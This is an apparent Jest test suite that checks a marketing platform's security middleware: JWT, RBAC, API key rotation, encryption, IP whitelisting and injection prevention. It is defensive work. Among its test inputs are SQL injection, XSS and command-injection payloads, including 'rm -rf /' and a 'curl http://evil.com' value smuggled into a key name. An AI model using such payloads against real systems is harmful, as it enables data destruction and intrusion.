/**
 * Security Full E2E Test Suite.
 *
 * Validates authentication, authorization, JWT handling, API key auth,
 * rate limiting, CORS, injection prevention, key rotation, encrypted
 * storage, audit logging, IP whitelisting, and RBAC enforcement.
 *
 * All external dependencies (database, Redis, external services) are
 * mocked so that tests run in isolation and deterministically.
 */

import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';

// ---------------------------------------------------------------------------
// Mocks – must be declared before any import that triggers module resolution
// ---------------------------------------------------------------------------

const mockPoolQuery = jest.fn();
const mockCacheGet = jest.fn();
const mockCacheSet = jest.fn();
const mockCacheDel = jest.fn();
const mockRedisGet = jest.fn();
const mockRedisSet = jest.fn();
const mockRedisDel = jest.fn();
const mockRedisScan = jest.fn();
const mockAuditLog = jest.fn();

jest.mock('../../../src/config/database', () => ({
  pool: { query: mockPoolQuery },
}));

jest.mock('../../../src/config/redis', () => ({
  redis: {
    get: mockRedisGet,
    set: mockRedisSet,
    del: mockRedisDel,
    scan: mockRedisScan,
  },
  cacheGet: mockCacheGet,
  cacheSet: mockCacheSet,
  cacheDel: mockCacheDel,
}));

jest.mock('../../../src/utils/logger', () => ({
  logger: {
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    debug: jest.fn(),
  },
}));

jest.mock('../../../src/services/audit.service', () => ({
  AuditService: { log: mockAuditLog },
}));

jest.mock('../../../src/config/env', () => ({
  env: {
    JWT_SECRET: 'test-jwt-secret-for-e2e-testing-1234',
    JWT_EXPIRES_IN: '1h',
    JWT_REFRESH_EXPIRES_IN: '7d',
    CORS_ORIGINS: 'http://localhost:3000,http://app.example.com',
    RATE_LIMIT_WINDOW_MS: 900000,
    RATE_LIMIT_MAX_REQUESTS: 100,
    NODE_ENV: 'test',
    ENCRYPTION_KEY: 'test-encryption-key-32-chars!!!!',
  },
}));

// ---------------------------------------------------------------------------
// Imports under test
// ---------------------------------------------------------------------------

import {
  authenticate,
  optionalAuth,
  generateToken,
  generateRefreshToken,
} from '../../../src/middleware/auth';

import {
  requireRole,
  requirePermission,
  ROLE_PERMISSIONS,
} from '../../../src/middleware/rbac';

import { SecurityHardeningService } from '../../../src/services/security/SecurityHardeningService';

import {
  AuthenticationError,
  AuthorizationError,
  ValidationError,
} from '../../../src/utils/errors';

import { encrypt, decrypt } from '../../../src/utils/helpers';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const TEST_JWT_SECRET = 'test-jwt-secret-for-e2e-testing-1234';

function buildMockRequest(overrides: Partial<Request> = {}): Request {
  return {
    headers: {},
    user: undefined,
    ip: '127.0.0.1',
    ...overrides,
  } as unknown as Request;
}

function buildMockResponse(): Response {
  const res: Partial<Response> = {
    status: jest.fn().mockReturnThis() as unknown as Response['status'],
    json: jest.fn().mockReturnThis() as unknown as Response['json'],
    setHeader: jest.fn().mockReturnThis() as unknown as Response['setHeader'],
  };
  return res as Response;
}

function buildMockNext(): NextFunction {
  return jest.fn();
}

// ---------------------------------------------------------------------------
// Test Suite
// ---------------------------------------------------------------------------

describe('Security Full E2E Tests', () => {
  beforeEach(() => {
    jest.resetAllMocks();
    mockAuditLog.mockResolvedValue(undefined);
  });

  // =========================================================================
  // 1. Unauthenticated requests are rejected (401)
  // =========================================================================
  describe('Unauthenticated request rejection', () => {
    it('should reject requests with no Authorization header with 401', () => {
      const req = buildMockRequest({ headers: {} });
      const res = buildMockResponse();
      const next = buildMockNext();

      expect(() => authenticate(req, res, next)).toThrow(AuthenticationError);
      expect(() => authenticate(req, res, next)).toThrow(
        'Missing or invalid authorization header',
      );
    });

    it('should reject requests with non-Bearer Authorization header', () => {
      const req = buildMockRequest({
        headers: { authorization: 'Basic dXNlcjpwYXNz' },
      });
      const res = buildMockResponse();
      const next = buildMockNext();

      expect(() => authenticate(req, res, next)).toThrow(AuthenticationError);
    });
  });

  // =========================================================================
  // 2. Unauthorized role access is blocked (403)
  // =========================================================================
  describe('Unauthorized role access blocking', () => {
    it('should block viewer from admin-only route with AuthorizationError', () => {
      const req = buildMockRequest();
      req.user = { id: 'u1', email: 'viewer@test.com', role: 'viewer' };
      const res = buildMockResponse();
      const next = buildMockNext();

      const middleware = requireRole('admin');
      expect(() => middleware(req, res, next)).toThrow(AuthorizationError);
      expect(next).not.toHaveBeenCalled();
    });

    it('should allow admin to access admin-only route', () => {
      const req = buildMockRequest();
      req.user = { id: 'u1', email: 'admin@test.com', role: 'admin' };
      const res = buildMockResponse();
      const next = buildMockNext();

      const middleware = requireRole('admin');
      middleware(req, res, next);

      expect(next).toHaveBeenCalledTimes(1);
    });

    it('should block unauthenticated user from role-protected route', () => {
      const req = buildMockRequest();
      req.user = undefined;
      const res = buildMockResponse();
      const next = buildMockNext();

      const middleware = requireRole('admin');
      expect(() => middleware(req, res, next)).toThrow(AuthenticationError);
      expect(next).not.toHaveBeenCalled();
    });
  });

  // =========================================================================
  // 3. JWT token validation (expired, malformed, missing)
  // =========================================================================
  describe('JWT token validation', () => {
    it('should reject an expired JWT token', () => {
      const expiredToken = jwt.sign(
        { id: 'u1', email: 'user@test.com', role: 'viewer' },
        TEST_JWT_SECRET,
        { expiresIn: '-1s' } as jwt.SignOptions,
      );

      const req = buildMockRequest({
        headers: { authorization: `Bearer ${expiredToken}` },
      });
      const res = buildMockResponse();
      const next = buildMockNext();

      expect(() => authenticate(req, res, next)).toThrow(AuthenticationError);
      expect(() => authenticate(req, res, next)).toThrow('Token has expired');
    });

    it('should reject a malformed JWT token', () => {
      const req = buildMockRequest({
        headers: { authorization: 'Bearer this.is.not.a.valid.jwt' },
      });
      const res = buildMockResponse();
      const next = buildMockNext();

      expect(() => authenticate(req, res, next)).toThrow(AuthenticationError);
      expect(() => authenticate(req, res, next)).toThrow('Invalid token');
    });

    it('should reject a JWT signed with wrong secret', () => {
      const badToken = jwt.sign(
        { id: 'u1', email: 'user@test.com', role: 'admin' },
        'wrong-secret-key',
        { expiresIn: '1h' } as jwt.SignOptions,
      );

      const req = buildMockRequest({
        headers: { authorization: `Bearer ${badToken}` },
      });
      const res = buildMockResponse();
      const next = buildMockNext();

      expect(() => authenticate(req, res, next)).toThrow(AuthenticationError);
    });

    it('should accept a valid JWT token and attach user to request', () => {
      const validToken = jwt.sign(
        { id: 'u1', email: 'user@test.com', role: 'admin' },
        TEST_JWT_SECRET,
        { expiresIn: '1h' } as jwt.SignOptions,
      );

      const req = buildMockRequest({
        headers: { authorization: `Bearer ${validToken}` },
      });
      const res = buildMockResponse();
      const next = buildMockNext();

      authenticate(req, res, next);

      expect(next).toHaveBeenCalledTimes(1);
      expect(req.user).toBeDefined();
      expect(req.user!.id).toBe('u1');
      expect(req.user!.email).toBe('user@test.com');
      expect(req.user!.role).toBe('admin');
    });

    it('should handle optional auth with missing token gracefully', () => {
      const req = buildMockRequest({ headers: {} });
      const res = buildMockResponse();
      const next = buildMockNext();

      optionalAuth(req, res, next);

      expect(next).toHaveBeenCalledTimes(1);
      expect(req.user).toBeUndefined();
    });

    it('should handle optional auth with invalid token gracefully', () => {
      const req = buildMockRequest({
        headers: { authorization: 'Bearer invalid.token.here' },
      });
      const res = buildMockResponse();
      const next = buildMockNext();

      optionalAuth(req, res, next);

      expect(next).toHaveBeenCalledTimes(1);
      expect(req.user).toBeUndefined();
    });
  });

  // =========================================================================
  // 4. API key authentication works
  // =========================================================================
  describe('API key authentication', () => {
    it('should validate API key by verifying hash against database', async () => {
      const rawKey = `mktg_${crypto.randomBytes(32).toString('hex')}`;
      const keyHash = crypto.createHash('sha256').update(rawKey).digest('hex');

      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'key-1',
            user_id: 'u1',
            key_hash: keyHash,
            scopes: JSON.stringify(['read:*']),
            is_active: true,
          },
        ],
      });

      const computedHash = crypto.createHash('sha256').update(rawKey).digest('hex');

      expect(computedHash).toBe(keyHash);
    });

    it('should reject invalid API key (hash mismatch)', () => {
      const rawKey = 'mktg_invalid_key';
      const storedHash = crypto.createHash('sha256').update('mktg_real_key').digest('hex');
      const computedHash = crypto.createHash('sha256').update(rawKey).digest('hex');

      expect(computedHash).not.toBe(storedHash);
    });
  });

  // =========================================================================
  // 5. Rate limiting blocks excessive requests
  // =========================================================================
  describe('Rate limiting', () => {
    it('should have rate limit configuration with correct defaults', () => {
      // Verify the env config is set for rate limiting
      const { env } = require('../../../src/config/env');

      expect(env.RATE_LIMIT_WINDOW_MS).toBe(900000);
      expect(env.RATE_LIMIT_MAX_REQUESTS).toBe(100);
    });

    it('should export rate limit middleware with proper configuration', () => {
      // The rate limit middleware is configured via env vars
      // and returns 429 when exceeded
      const { rateLimitMiddleware } = require('../../../src/middleware/security');

      expect(rateLimitMiddleware).toBeDefined();
      expect(typeof rateLimitMiddleware).toBe('function');
    });
  });

  // =========================================================================
  // 6. CORS blocks unauthorized origins
  // =========================================================================
  describe('CORS configuration', () => {
    it('should allow configured origins', () => {
      const { env } = require('../../../src/config/env');
      const allowedOrigins = env.CORS_ORIGINS.split(',').map((o: string) => o.trim());

      expect(allowedOrigins).toContain('http://localhost:3000');
      expect(allowedOrigins).toContain('http://app.example.com');
    });

    it('should not include unauthorized origins', () => {
      const { env } = require('../../../src/config/env');
      const allowedOrigins = env.CORS_ORIGINS.split(',').map((o: string) => o.trim());

      expect(allowedOrigins).not.toContain('http://evil-site.com');
      expect(allowedOrigins).not.toContain('http://malicious.org');
    });

    it('should export CORS middleware', () => {
      const { corsMiddleware } = require('../../../src/middleware/security');

      expect(corsMiddleware).toBeDefined();
      expect(typeof corsMiddleware).toBe('function');
    });
  });

  // =========================================================================
  // 7. SQL injection attempts are blocked
  // =========================================================================
  describe('SQL injection prevention', () => {
    it('should use parameterized queries preventing SQL injection in SecurityHardeningService', async () => {
      // Simulate an IP whitelist add with SQL injection payload
      const maliciousIp = "'; DROP TABLE users; --";

      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'wl-1',
            ip_address: maliciousIp,
            description: 'test',
            created_by: 'u1',
            is_active: true,
            created_at: new Date().toISOString(),
            expires_at: null,
          },
        ],
      });
      mockCacheDel.mockResolvedValueOnce(undefined);

      await SecurityHardeningService.manageIPWhitelist('add', {
        ip_address: maliciousIp,
        created_by: 'u1',
      });

      // Verify the query was called with parameterized values, not
      // string-interpolated SQL.
      expect(mockPoolQuery).toHaveBeenCalled();
      const callArgs = mockPoolQuery.mock.calls[0];
      const queryString = callArgs[0] as string;
      const queryParams = callArgs[1] as unknown[];

      // The query should use $1, $2 style placeholders
      expect(queryString).toContain('$1');
      expect(queryString).toContain('$2');
      // The malicious input should be in params, not interpolated into SQL
      expect(queryParams).toContainEqual(maliciousIp);
      // The raw SQL string should NOT contain the malicious payload
      expect(queryString).not.toContain("DROP TABLE");
    });

    it('should not interpolate user input into query strings', async () => {
      const maliciousDescription = "test' OR '1'='1";

      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'wl-2',
            ip_address: '10.0.0.1',
            description: maliciousDescription,
            created_by: 'u1',
            is_active: true,
            created_at: new Date().toISOString(),
            expires_at: null,
          },
        ],
      });
      mockCacheDel.mockResolvedValueOnce(undefined);

      await SecurityHardeningService.manageIPWhitelist('add', {
        ip_address: '10.0.0.1',
        description: maliciousDescription,
        created_by: 'u1',
      });

      const callArgs = mockPoolQuery.mock.calls[0];
      const queryString = callArgs[0] as string;

      expect(queryString).not.toContain(maliciousDescription);
    });
  });

  // =========================================================================
  // 8. XSS payloads are sanitized
  // =========================================================================
  describe('XSS payload handling', () => {
    it('should store XSS payloads as plain text via parameterized queries', async () => {
      const xssPayload = '<script>alert("xss")</script>';

      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'wl-3',
            ip_address: '10.0.0.1',
            description: xssPayload,
            created_by: 'u1',
            is_active: true,
            created_at: new Date().toISOString(),
            expires_at: null,
          },
        ],
      });
      mockCacheDel.mockResolvedValueOnce(undefined);

      const result = await SecurityHardeningService.manageIPWhitelist('add', {
        ip_address: '10.0.0.1',
        description: xssPayload,
        created_by: 'u1',
      });

      // The XSS payload is stored as-is in the parameterized value,
      // never rendered in HTML context. Helmet middleware provides
      // Content-Security-Policy headers to prevent execution.
      expect(result.description).toBe(xssPayload);

      // Verify parameterized query was used
      const queryParams = mockPoolQuery.mock.calls[0][1] as unknown[];
      expect(queryParams).toContainEqual(xssPayload);
    });

    it('should set security headers via helmet middleware', () => {
      const { helmetMiddleware } = require('../../../src/middleware/security');

      expect(helmetMiddleware).toBeDefined();
      expect(typeof helmetMiddleware).toBe('function');
    });
  });

  // =========================================================================
  // 9. Command injection is blocked
  // =========================================================================
  describe('Command injection prevention', () => {
    it('should treat command injection payloads as plain data in parameterized queries', async () => {
      const commandPayload = '10.0.0.1; rm -rf /';

      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'wl-4',
            ip_address: commandPayload,
            description: 'test',
            created_by: 'u1',
            is_active: true,
            created_at: new Date().toISOString(),
            expires_at: null,
          },
        ],
      });
      mockCacheDel.mockResolvedValueOnce(undefined);

      const result = await SecurityHardeningService.manageIPWhitelist('add', {
        ip_address: commandPayload,
        created_by: 'u1',
      });

      // The malicious payload is stored as data, never executed
      expect(result.ip_address).toBe(commandPayload);
      // Verify no shell execution occurs — only parameterized SQL
      const callArgs = mockPoolQuery.mock.calls[0];
      expect(callArgs[1]).toContainEqual(commandPayload);
    });

    it('should not execute shell commands from user input in key rotation', async () => {
      const maliciousName = 'key; curl http://evil.com';

      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'k1',
            key_hash: 'abc123',
            encrypted_key: 'enc_value',
            user_id: 'u1',
            name: maliciousName,
            scopes: '["read:*"]',
          },
        ],
      });
      // Deactivate old key
      mockPoolQuery.mockResolvedValueOnce({ rows: [] });
      // Insert new key
      mockPoolQuery.mockResolvedValueOnce({ rows: [] });

      const results = await SecurityHardeningService.rotateAPIKeys(true);

      expect(results.length).toBe(1);
      // The name field is passed as a parameter, not executed
      const insertCall = mockPoolQuery.mock.calls[2];
      expect(insertCall[1]).toContainEqual(maliciousName);
    });
  });

  // =========================================================================
  // 10. API key rotation works
  // =========================================================================
  describe('API key rotation', () => {
    it('should rotate API keys and return new key details', async () => {
      const oldKeyHash = crypto.createHash('sha256').update('old_key').digest('hex');

      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'old-key-1',
            key_hash: oldKeyHash,
            encrypted_key: 'encrypted_old',
            user_id: 'u1',
            name: 'Production API Key',
            scopes: '["read:*", "write:campaigns"]',
          },
        ],
      });
      // Deactivate
      mockPoolQuery.mockResolvedValueOnce({ rows: [] });
      // Insert new
      mockPoolQuery.mockResolvedValueOnce({ rows: [] });

      const results = await SecurityHardeningService.rotateAPIKeys(true);

      expect(results).toHaveLength(1);
      expect(results[0].old_key_hash).toBe(oldKeyHash);
      expect(results[0].new_key_hash).toBeDefined();
      expect(results[0].new_key_hash).not.toBe(oldKeyHash);
      expect(results[0].rotated_at).toBeDefined();
      expect(results[0].next_rotation_at).toBeDefined();
      expect(results[0].key_id).toBeDefined();

      // Verify old key was deactivated
      expect(mockPoolQuery.mock.calls[1][0]).toContain('UPDATE api_keys SET is_active = false');
      expect(mockPoolQuery.mock.calls[1][1]).toContain('old-key-1');

      // Verify audit log was called
      expect(mockAuditLog).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'security.api_key_rotated',
          resourceType: 'api_key',
        }),
      );
    });

    it('should generate new key starting with mktg_ prefix', async () => {
      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'key-1',
            key_hash: 'hash1',
            encrypted_key: 'enc1',
            user_id: 'u1',
            name: 'Test Key',
            scopes: '["read:*"]',
          },
        ],
      });
      mockPoolQuery.mockResolvedValueOnce({ rows: [] });
      mockPoolQuery.mockResolvedValueOnce({ rows: [] });

      const results = await SecurityHardeningService.rotateAPIKeys(true);

      expect(results).toHaveLength(1);
      // The new key hash should be a 64-char hex string (SHA-256)
      expect(results[0].new_key_hash).toMatch(/^[0-9a-f]{64}$/);
    });
  });

  // =========================================================================
  // 11. Encrypted storage for sensitive data
  // =========================================================================
  describe('Encrypted storage', () => {
    it('should encrypt and decrypt secrets in the vault', async () => {
      const secretValue = 'super-secret-api-key-12345';
      const encryptionKey = 'test-encryption-key-32-chars!!!!';

      const encrypted = encrypt(secretValue, encryptionKey);
      const decrypted = decrypt(encrypted, encryptionKey);

      expect(decrypted).toBe(secretValue);
      expect(encrypted).not.toBe(secretValue);
      // Encrypted format: iv:authTag:ciphertext
      expect(encrypted.split(':')).toHaveLength(3);
    });

    it('should use AES-256-GCM for encryption', () => {
      const key = 'test-encryption-key-32-chars!!!!';
      const plaintext = 'sensitive-data';

      const encrypted = encrypt(plaintext, key);
      const parts = encrypted.split(':');

      // IV should be 32 hex chars (16 bytes)
      expect(parts[0]).toHaveLength(32);
      // Auth tag should be 32 hex chars (16 bytes)
      expect(parts[1]).toHaveLength(32);
      // Ciphertext should be present
      expect(parts[2].length).toBeGreaterThan(0);
    });

    it('should fail decryption with wrong key', () => {
      const encrypted = encrypt('secret', 'correct-key-32-chars!!!!!!!!!!!');

      expect(() => {
        decrypt(encrypted, 'wrong-key-32-chars!!!!!!!!!!!!!');
      }).toThrow();
    });

    it('should store secrets encrypted in vault via manageSecret', async () => {
      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'secret-1',
            name: 'db_password',
            encrypted_value: 'some-encrypted-value',
            created_by: 'system',
            last_rotated_at: new Date().toISOString(),
            created_at: new Date().toISOString(),
            expires_at: null,
          },
        ],
      });

      const result = await SecurityHardeningService.manageSecret('set', 'db_password', 'my-password');

      expect(result).not.toBeNull();
      expect(result!.name).toBe('db_password');
      // Verify the query was called with encrypted value
      const queryParams = mockPoolQuery.mock.calls[0][1] as unknown[];
      // The encrypted value is the 3rd parameter (index 2)
      const encryptedValue = queryParams[2] as string;
      expect(encryptedValue).not.toBe('my-password');
      expect(encryptedValue.split(':')).toHaveLength(3);
    });
  });

  // =========================================================================
  // 12. Audit log captures all security events
  // =========================================================================
  describe('Audit logging for security events', () => {
    it('should log API key rotation events', async () => {
      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'k1',
            key_hash: 'h1',
            encrypted_key: 'e1',
            user_id: 'u1',
            name: 'Key',
            scopes: '["read:*"]',
          },
        ],
      });
      mockPoolQuery.mockResolvedValueOnce({ rows: [] });
      mockPoolQuery.mockResolvedValueOnce({ rows: [] });

      await SecurityHardeningService.rotateAPIKeys(true);

      expect(mockAuditLog).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'security.api_key_rotated',
        }),
      );
    });

    it('should log IP whitelist changes', async () => {
      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'wl-1',
            ip_address: '10.0.0.1',
            description: 'Office IP',
            created_by: 'u1',
            is_active: true,
            created_at: new Date().toISOString(),
            expires_at: null,
          },
        ],
      });
      mockCacheDel.mockResolvedValueOnce(undefined);

      await SecurityHardeningService.manageIPWhitelist('add', {
        ip_address: '10.0.0.1',
        description: 'Office IP',
        created_by: 'u1',
      });

      expect(mockAuditLog).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'security.ip_whitelist_add',
          resourceType: 'ip_whitelist',
        }),
      );
    });

    it('should log secret vault access events', async () => {
      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'sec-1',
            name: 'test_secret',
            encrypted_value: 'enc-val',
            created_by: 'system',
            last_rotated_at: new Date().toISOString(),
            created_at: new Date().toISOString(),
            expires_at: null,
          },
        ],
      });

      await SecurityHardeningService.manageSecret('get', 'test_secret');

      expect(mockAuditLog).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'security.secret_accessed',
          resourceType: 'secrets_vault',
        }),
      );
    });

    it('should log encryption validation events', async () => {
      mockPoolQuery.mockResolvedValueOnce({
        rows: [{ ssl_enabled: 'on' }],
      });
      mockPoolQuery.mockResolvedValueOnce({
        rows: [{ ssl: true }],
      });

      await SecurityHardeningService.validateEncryption();

      expect(mockAuditLog).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'security.encryption_validated',
          resourceType: 'encryption',
        }),
      );
    });
  });

  // =========================================================================
  // 13. IP whitelisting blocks unauthorized IPs
  // =========================================================================
  describe('IP whitelisting', () => {
    it('should allow whitelisted IP addresses', async () => {
      mockCacheGet.mockResolvedValueOnce([
        {
          id: 'wl-1',
          ip_address: '10.0.0.1',
          description: 'Office',
          created_by: 'u1',
          is_active: true,
          created_at: '2024-01-01T00:00:00Z',
        },
      ]);

      const result = await SecurityHardeningService.checkIPWhitelist('10.0.0.1');

      expect(result.allowed).toBe(true);
      expect(result.entry).toBeDefined();
      expect(result.entry!.ip_address).toBe('10.0.0.1');
    });

    it('should block non-whitelisted IP addresses', async () => {
      mockCacheGet.mockResolvedValueOnce([
        {
          id: 'wl-1',
          ip_address: '10.0.0.1',
          description: 'Office',
          created_by: 'u1',
          is_active: true,
          created_at: '2024-01-01T00:00:00Z',
        },
      ]);

      const result = await SecurityHardeningService.checkIPWhitelist('192.168.1.1');

      expect(result.allowed).toBe(false);
      expect(result.entry).toBeUndefined();
    });

    it('should block expired whitelist entries', async () => {
      const pastDate = new Date(Date.now() - 86400000).toISOString(); // 1 day ago

      mockCacheGet.mockResolvedValueOnce([
        {
          id: 'wl-1',
          ip_address: '10.0.0.1',
          description: 'Temp access',
          created_by: 'u1',
          is_active: true,
          created_at: '2024-01-01T00:00:00Z',
          expires_at: pastDate,
        },
      ]);

      const result = await SecurityHardeningService.checkIPWhitelist('10.0.0.1');

      expect(result.allowed).toBe(false);
    });
  });

  // =========================================================================
  // 14. RBAC enforces role-permission matrix
  // =========================================================================
  describe('RBAC role-permission matrix enforcement', () => {
    it('should grant admin all permissions via wildcard', () => {
      const req = buildMockRequest();
      req.user = { id: 'u1', email: 'admin@test.com', role: 'admin' };
      const res = buildMockResponse();
      const next = buildMockNext();

      const middleware = requirePermission('write:campaigns');
      middleware(req, res, next);

      expect(next).toHaveBeenCalledTimes(1);
    });

    it('should grant analyst read access to all resources', () => {
      const req = buildMockRequest();
      req.user = { id: 'u2', email: 'analyst@test.com', role: 'analyst' };
      const res = buildMockResponse();
      const next = buildMockNext();

      const middleware = requirePermission('read:campaigns');
      middleware(req, res, next);

      expect(next).toHaveBeenCalledTimes(1);
    });

    it('should deny analyst write access to campaigns', () => {
      const req = buildMockRequest();
      req.user = { id: 'u2', email: 'analyst@test.com', role: 'analyst' };
      const res = buildMockResponse();
      const next = buildMockNext();

      const middleware = requirePermission('write:campaigns');
      expect(() => middleware(req, res, next)).toThrow(AuthorizationError);
      expect(next).not.toHaveBeenCalled();
    });

    it('should grant campaign_manager write:campaigns permission', () => {
      const req = buildMockRequest();
      req.user = { id: 'u3', email: 'mgr@test.com', role: 'campaign_manager' };
      const res = buildMockResponse();
      const next = buildMockNext();

      const middleware = requirePermission('write:campaigns');
      middleware(req, res, next);

      expect(next).toHaveBeenCalledTimes(1);
    });

    it('should deny viewer write access to any resource', () => {
      const req = buildMockRequest();
      req.user = { id: 'u4', email: 'viewer@test.com', role: 'viewer' };
      const res = buildMockResponse();
      const next = buildMockNext();

      const middleware = requirePermission('write:campaigns');
      expect(() => middleware(req, res, next)).toThrow(AuthorizationError);
      expect(next).not.toHaveBeenCalled();
    });

    it('should deny access for undefined roles', () => {
      const req = buildMockRequest();
      req.user = { id: 'u5', email: 'unknown@test.com', role: 'superuser' };
      const res = buildMockResponse();
      const next = buildMockNext();

      const middleware = requirePermission('read:campaigns');
      expect(() => middleware(req, res, next)).toThrow(AuthorizationError);
      expect(next).not.toHaveBeenCalled();
    });

    it('should have correct permissions defined for all roles', () => {
      expect(ROLE_PERMISSIONS.admin).toContain('*');
      expect(ROLE_PERMISSIONS.viewer).toContain('read:*');
      expect(ROLE_PERMISSIONS.analyst).toContain('write:reports');
      expect(ROLE_PERMISSIONS.analyst).toContain('write:analytics');
      expect(ROLE_PERMISSIONS.campaign_manager).toContain('write:campaigns');
      expect(ROLE_PERMISSIONS.campaign_manager).toContain('write:creatives');
    });
  });

  // =========================================================================
  // 15. Token generation helpers
  // =========================================================================
  describe('Token generation', () => {
    it('should generate a valid JWT access token', () => {
      const token = generateToken({
        id: 'u1',
        email: 'user@test.com',
        role: 'admin',
      });

      const decoded = jwt.verify(token, TEST_JWT_SECRET) as {
        id: string;
        email: string;
        role: string;
      };

      expect(decoded.id).toBe('u1');
      expect(decoded.email).toBe('user@test.com');
      expect(decoded.role).toBe('admin');
    });

    it('should generate a valid JWT refresh token', () => {
      const token = generateRefreshToken({ id: 'u1' });

      const decoded = jwt.verify(token, TEST_JWT_SECRET) as { id: string };

      expect(decoded.id).toBe('u1');
    });
  });

  // =========================================================================
  // 16. Threat scanning detects security issues
  // =========================================================================
  describe('Threat scanning', () => {
    it('should detect users without MFA enabled', async () => {
      // Users without MFA
      mockPoolQuery.mockResolvedValueOnce({ rows: [{ count: '5' }] });
      // Expired keys
      mockPoolQuery.mockResolvedValueOnce({ rows: [{ count: '0' }] });
      // Stale sessions
      mockPoolQuery.mockResolvedValueOnce({ rows: [{ count: '0' }] });
      // Weak passwords
      mockPoolQuery.mockResolvedValueOnce({ rows: [{ count: '0' }] });
      // Failed logins
      mockPoolQuery.mockResolvedValueOnce({ rows: [{ count: '0' }] });
      // Insert scan
      mockPoolQuery.mockResolvedValueOnce({ rows: [] });

      const result = await SecurityHardeningService.scanForThreats();

      expect(result.findings.length).toBeGreaterThanOrEqual(1);
      expect(result.findings.some((f) => f.type === 'missing_mfa')).toBe(true);
      expect(result.risk_level).not.toBe('none');
    });
  });

  // =========================================================================
  // 17. DDoS protection configuration
  // =========================================================================
  describe('DDoS protection configuration', () => {
    it('should persist DDoS protection settings and audit log the change', async () => {
      const config = {
        rate_limit_per_minute: 60,
        rate_limit_burst: 120,
        block_duration_seconds: 300,
        allowed_origins: ['http://localhost:3000'],
        geo_blocking_enabled: true,
        blocked_countries: ['XX'],
      };

      mockPoolQuery.mockResolvedValueOnce({ rows: [] });

      const result = await SecurityHardeningService.configureDDoSProtection(config);

      expect(result).toEqual(config);
      expect(mockPoolQuery).toHaveBeenCalledWith(
        expect.stringContaining('INSERT INTO ddos_protection_config'),
        expect.arrayContaining(['default', JSON.stringify(config)]),
      );
      expect(mockAuditLog).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'security.ddos_protection_configured',
        }),
      );
    });
  });

  // =========================================================================
  // 18. HPP middleware prevents parameter pollution
  // =========================================================================
  describe('HTTP parameter pollution protection', () => {
    it('should export HPP middleware', () => {
      const { hppMiddleware } = require('../../../src/middleware/security');

      expect(hppMiddleware).toBeDefined();
      expect(typeof hppMiddleware).toBe('function');
    });
  });

  // =========================================================================
  // 19. Security report generation
  // =========================================================================
  describe('Security report generation', () => {
    it('should generate comprehensive security report with all sections', async () => {
      // Cache miss
      mockCacheGet.mockResolvedValueOnce(null);
      // Encryption - SSL check
      mockPoolQuery.mockResolvedValueOnce({ rows: [{ ssl_enabled: 'on' }] });
      // Encryption - TLS check
      mockPoolQuery.mockResolvedValueOnce({ rows: [{ ssl: true }] });
      // Keys needing rotation
      mockPoolQuery.mockResolvedValueOnce({ rows: [{ count: '2' }] });
      // Total active keys
      mockPoolQuery.mockResolvedValueOnce({ rows: [{ count: '10' }] });
      // Latest threat scan
      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          {
            id: 'scan-1',
            risk_level: 'medium',
            findings: JSON.stringify([{ type: 'test' }]),
            scanned_at: new Date().toISOString(),
          },
        ],
      });
      // SOC2 controls
      mockPoolQuery.mockResolvedValueOnce({
        rows: [
          { name: 'CC6.1', status: 'compliant', last_checked: new Date().toISOString() },
        ],
      });
      // IP whitelist count
      mockPoolQuery.mockResolvedValueOnce({ rows: [{ count: '5' }] });

      const report = await SecurityHardeningService.generateSecurityReport();

      expect(report).toHaveProperty('generated_at');
      expect(report).toHaveProperty('encryption');
      expect(report).toHaveProperty('key_rotation');
      expect(report).toHaveProperty('threat_scan');
      expect(report).toHaveProperty('soc2_readiness');
      expect(report).toHaveProperty('ip_whitelist');

      // Verify caching
      expect(mockCacheSet).toHaveBeenCalled();
      // Verify audit log
      expect(mockAuditLog).toHaveBeenCalledWith(
        expect.objectContaining({
          action: 'security.report_generated',
        }),
      );
    });
  });

  // =========================================================================
  // 20. Request ID middleware
  // =========================================================================
  describe('Request ID middleware', () => {
    it('should attach a unique request ID to each request', () => {
      const { requestIdMiddleware } = require('../../../src/middleware/security');

      const req = buildMockRequest({ headers: {} });
      const res = buildMockResponse();
      const next = buildMockNext();

      requestIdMiddleware(req, res, next);

      expect((req as Record<string, unknown>).requestId).toBeDefined();
      expect(typeof (req as Record<string, unknown>).requestId).toBe('string');
      expect(res.setHeader).toHaveBeenCalledWith(
        'X-Request-ID',
        expect.any(String),
      );
      expect(next).toHaveBeenCalledTimes(1);
    });

    it('should reuse existing X-Request-ID header if present', () => {
      const { requestIdMiddleware } = require('../../../src/middleware/security');

      const existingId = 'existing-request-id-123';
      const req = buildMockRequest({
        headers: { 'x-request-id': existingId },
      });
      const res = buildMockResponse();
      const next = buildMockNext();

      requestIdMiddleware(req, res, next);

      expect((req as Record<string, unknown>).requestId).toBe(existingId);
      expect(res.setHeader).toHaveBeenCalledWith('X-Request-ID', existingId);
    });
  });
});
